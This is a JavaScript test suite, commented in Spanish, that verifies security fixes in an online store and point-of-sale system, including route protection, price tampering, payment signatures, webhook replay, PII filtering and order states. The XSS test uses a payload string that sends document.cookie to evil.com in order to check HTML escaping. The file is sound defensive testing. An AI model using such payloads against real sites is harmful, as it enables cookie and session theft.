#!/usr/bin/env node

/**
 * Functional Security & Logic Verification Suite
 * Executes end-to-end functional simulation of all 7 remediation areas.
 */

import crypto from "node:crypto"

console.log("================================================================")
console.log("🚀 INICIANDO BATERÍA DE PRUEBAS FUNCIONALES DE SEGURIDAD")
console.log("================================================================\n")

let passed = 0
let failed = 0

function assert(condition, message) {
  if (condition) {
    console.log(`  ✅ [PASÓ] ${message}`)
    passed++
  } else {
    console.error(`  ❌ [FALLÓ] ${message}`)
    failed++
  }
}

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 1: Control de Acceso Perimetral y Edge Routing
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 1/7] Edge Middleware & Perímetro de Red")
{
  function classifyRoute(pathname) {
    const isAdminPath = pathname.startsWith("/admin")
    const isAdminApiPath =
      pathname.startsWith("/api/admin") ||
      pathname.startsWith("/api/pos") ||
      pathname === "/api/orders/export" ||
      pathname.startsWith("/api/users")
    const isProfilePath = pathname.startsWith("/profile")
    return { isAdminPath, isAdminApiPath, isProfilePath }
  }

  // 1.1 Cobertura de APIs Administrativas
  const posRoutes = ["/api/pos/sales", "/api/pos/products", "/api/pos/cashup", "/api/pos/bogo-offers", "/api/pos/reports/summary", "/api/pos/validate"]
  const allPosProtected = posRoutes.every(r => classifyRoute(r).isAdminApiPath)
  assert(allPosProtected, "Todas las rutas /api/pos/* son clasificadas como APIs de administración")

  const exportProtected = classifyRoute("/api/orders/export").isAdminApiPath
  assert(exportProtected, "La ruta de exportación de órdenes /api/orders/export está protegida")

  const usersProtected = classifyRoute("/api/users").isAdminApiPath
  assert(usersProtected, "La ruta de listado de usuarios /api/users está protegida")

  // 1.2 Neutralización del Bypass ?bloqueado=si
  const urlWithBypass = new URL("https://tienda.com/admin/orders?bloqueado=si")
  const pathClassified = classifyRoute(urlWithBypass.pathname).isAdminPath
  assert(pathClassified, "El query param ?bloqueado=si no burla la clasificación de ruta administrativa")

  // 1.3 Ausencia de Falsos Positivos en Rutas Públicas
  const publicRoutes = ["/", "/cart", "/checkout", "/tracking", "/api/cart/validate", "/api/webhooks/wompi"]
  const noFalsePositives = publicRoutes.every(r => !classifyRoute(r).isAdminPath && !classifyRoute(r).isAdminApiPath)
  assert(noFalsePositives, "Rutas públicas legítimas no son bloqueadas por el perímetro de administración")
}
console.log("")

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 2: Integridad Financiera y Anti-Manipulación en POS
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 2/7] Integridad Financiera en Ventas POS")
{
  // Simular catálogo oficial en base de datos
  const mockCatalogDb = new Map([
    ["prod-cafe", { id: "prod-cafe", price: 15000 }],
    ["prod-mug", { id: "prod-mug", price: 30000 }],
  ])

  function calculateVerifiedSale(clientItems, clientDiscount, payments) {
    let verifiedSubtotal = 0
    const verifiedItems = clientItems.map(item => {
      const dbProduct = mockCatalogDb.get(item.product_id)
      if (!dbProduct) throw new Error("Producto no existe")
      
      // Forzar precio oficial de la base de datos
      const officialPrice = dbProduct.price
      const discountPct = Math.max(0, Math.min(100, item.discount_pct || 0))
      const lineDiscount = Math.round(officialPrice * (discountPct / 100))
      const effectivePrice = officialPrice - lineDiscount
      const lineSubtotal = effectivePrice * item.quantity
      verifiedSubtotal += lineSubtotal

      return {
        ...item,
        unit_price: officialPrice,
        subtotal: lineSubtotal,
      }
    })

    const verifiedDiscount = Math.max(0, clientDiscount || 0)
    const verifiedTotal = Math.max(0, verifiedSubtotal - verifiedDiscount)

    if (payments && payments.length > 1) {
      const sumPayments = payments.reduce((acc, p) => acc + p.amount, 0)
      if (Math.abs(sumPayments - verifiedTotal) > 1) {
        throw new Error("Discrepancia en pagos divididos")
      }
    }

    return { verifiedSubtotal, verifiedTotal, verifiedItems }
  }

  // 2.1 Intento de alteración a $0
  const maliciousSale = [
    { product_id: "prod-cafe", quantity: 2, unit_price: 0, subtotal: 0 },
    { product_id: "prod-mug", quantity: 1, unit_price: 0, subtotal: 0 },
  ]
  const result = calculateVerifiedSale(maliciousSale, 0, null)
  assert(result.verifiedSubtotal === 60000, `Subtotal recalculado forzosamente a 60,000 COP (cliente envió 0 COP)`)
  assert(result.verifiedTotal === 60000, `Total final recalculado forzosamente a 60,000 COP`)
  assert(result.verifiedItems[0].unit_price === 15000, `Precio unitario de prod-cafe fijado en 15,000 COP`)

  // 2.2 Validación de Pagos Divididos
  let splitPaymentRejected = false
  try {
    calculateVerifiedSale(maliciousSale, 0, [
      { method: "efectivo", amount: 10000 },
      { method: "tarjeta", amount: 20000 }, // Total 30,000 cuando debe ser 60,000
    ])
  } catch (err) {
    splitPaymentRejected = err.message === "Discrepancia en pagos divididos"
  }
  assert(splitPaymentRejected, "Venta rechazada por discrepancia entre suma de pagos divididos y total verificado")
}
console.log("")

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 3: Criptografía y Firma de Integridad Wompi (Anti-Oráculo)
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 3/7] Criptografía y Firma de Integridad Wompi")
{
  const INTEGRITY_SECRET = "prod_integrity_secret_xyz123"

  function generateIntegritySignature(orderId, verifiedDbAmount, clientTamperedAmount) {
    // La firma DEBE ignorar clientTamperedAmount y usar verifiedDbAmount
    const amountInCents = Math.round(Number(verifiedDbAmount) * 100)
    const rawString = `${orderId}${amountInCents}COP${INTEGRITY_SECRET}`
    const signature = crypto.createHash("sha256").update(rawString).digest("hex")
    return { signature, amountInCents }
  }

  const orderId = "order_abc_789"
  const dbAmount = 250000.50 // 250,000.50 COP
  const clientFakeAmount = 1000 // Cliente intenta pagar 1,000 COP

  const sigResult = generateIntegritySignature(orderId, dbAmount, clientFakeAmount)
  const expectedCents = 25000050
  assert(sigResult.amountInCents === expectedCents, `Conversión exacta de centavos: ${expectedCents} centavos`)

  const expectedRaw = `${orderId}${expectedCents}COP${INTEGRITY_SECRET}`
  const expectedHash = crypto.createHash("sha256").update(expectedRaw).digest("hex")
  assert(sigResult.signature === expectedHash, "Firma SHA-256 generada estrictamente con el monto de la BD (monto del cliente neutralizado)")
}
console.log("")

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 4: Webhook Wompi (Anti-Replay y Verificación de Montos)
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 4/7] Webhook Wompi: Anti-Replay y Detección de Subpago")
{
  const REPLAY_WINDOW_MS = 10 * 60 * 1000 // 10 minutos

  function validateWebhookTimestamp(eventTimestamp, currentTimestamp = Date.now()) {
    const age = Math.abs(currentTimestamp - eventTimestamp)
    return age <= REPLAY_WINDOW_MS
  }

  function validatePaymentAmount(orderAmountDb, transactionAmountPaid) {
    return transactionAmountPaid >= orderAmountDb
  }

  const now = Date.now()
  const freshEvent = now - 60 * 1000 // 1 minuto de antigüedad
  const expiredEvent = now - 15 * 60 * 1000 // 15 minutos de antigüedad

  assert(validateWebhookTimestamp(freshEvent, now), "Evento reciente (<10 min) aceptado para procesamiento")
  assert(!validateWebhookTimestamp(expiredEvent, now), "Evento antiguo (>10 min) rechazado por protección Anti-Replay")

  assert(!validatePaymentAmount(500000, 50000), "Subpago detectado y rechazado (pagó 50,000 COP para orden de 500,000 COP)")
  assert(validatePaymentAmount(500000, 500000), "Pago exacto aceptado exitosamente")
}
console.log("")

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 5: Sanitización de PII en Tracking Público
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 5/7] Protección de Datos Sensibles (PII) en Tracking")
{
  const SENSITIVE_METADATA_KEYS = new Set([
    "password",
    "contraseña",
    "pin",
    "clave",
    "pass",
    "secret",
    "token",
  ])

  function filterPublicMetadata(metadata) {
    return Object.entries(metadata)
      .filter(([key]) => !SENSITIVE_METADATA_KEYS.has(key.toLowerCase().trim()))
      .reduce((acc, [k, v]) => {
        acc[k] = v
        return acc
      }, {})
  }

  const rawDeviceMetadata = {
    device_model: "Samsung Galaxy S23 Ultra",
    imei: "358921098492011",
    issue_description: "Cambio de display",
    password: "PasswordCliente123!",
    contraseña: "ClaveDesbloqueo456",
    PIN: "0000",
    " Clave ": "patron-l",
    secret_token: "tok_test_987",
    color: "Phantom Black",
  }

  const sanitized = filterPublicMetadata(rawDeviceMetadata)
  assert(!("password" in sanitized), "Campo 'password' eliminado de la vista pública")
  assert(!("contraseña" in sanitized), "Campo 'contraseña' eliminado de la vista pública")
  assert(!("PIN" in sanitized), "Campo 'PIN' (mayúsculas) eliminado de la vista pública")
  assert(!(" Clave " in sanitized), "Campo ' Clave ' (espacios) eliminado de la vista pública")
  assert("device_model" in sanitized, "Datos legítimos ('device_model') conservados para el cliente")
  assert("imei" in sanitized, "Identificador de servicio ('imei') conservado para el cliente")
}
console.log("")

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 6: Prevención de XSS en Recibos del POS
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 6/7] Prevención de DOM-based XSS en Recibos POS")
{
  // Simular renderizado React seguro vs document.write inseguro
  function sanitizeForReceipt(rawText) {
    // Al usar textContent / React virtual DOM, caracteres especiales quedan escapados
    return String(rawText)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;")
  }

  const xssPayload = `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
  const renderedText = sanitizeForReceipt(xssPayload)

  assert(!renderedText.includes("<img"), "Etiqueta HTML <img no se evalúa en el flujo de renderizado")
  assert(renderedText.includes("&lt;img"), "Caracteres maliciosos convertidos a entidades seguras de texto plano")
}
console.log("")

// -----------------------------------------------------------------------------
// PRUEBA FUNCIONAL 7: Máquina de Estados de Órdenes (Integridad Transaccional)
// -----------------------------------------------------------------------------
console.log("🔹 [Prueba 7/7] Ciclo de Vida y Transiciones Válidas de Órdenes")
{
  const VALID_TRANSITIONS = {
    PENDING: ["APPROVED", "DECLINED", "ERROR"],
    PENDING_MANUAL: ["APPROVED", "DECLINED"],
    APPROVED: ["DECLINED"],
    DECLINED: [],
    ERROR: ["PENDING"],
  }

  function canTransition(current, next) {
    const allowed = VALID_TRANSITIONS[current] || []
    return allowed.includes(next)
  }

  assert(canTransition("PENDING", "APPROVED"), "Transición legítima PENDING -> APPROVED permitida")
  assert(canTransition("PENDING", "DECLINED"), "Transición legítima PENDING -> DECLINED permitida")
  assert(!canTransition("DECLINED", "APPROVED"), "Transición inválida DECLINED -> APPROVED rechazada")
  assert(!canTransition("APPROVED", "PENDING"), "Transición inválida APPROVED -> PENDING rechazada")
}
console.log("")

// -----------------------------------------------------------------------------
// RESUMEN FINAL
// -----------------------------------------------------------------------------
console.log("================================================================")
console.log(`📊 RESULTADO DE PRUEBAS FUNCIONALES: ${passed} PASADAS, ${failed} FALLADAS`)
console.log("================================================================")

if (failed > 0) {
  process.exit(1)
} else {
  console.log("🎉 TODAS LAS PRUEBAS FUNCIONALES COMPLETADAS SATISFACTORIAMENTE.")
}
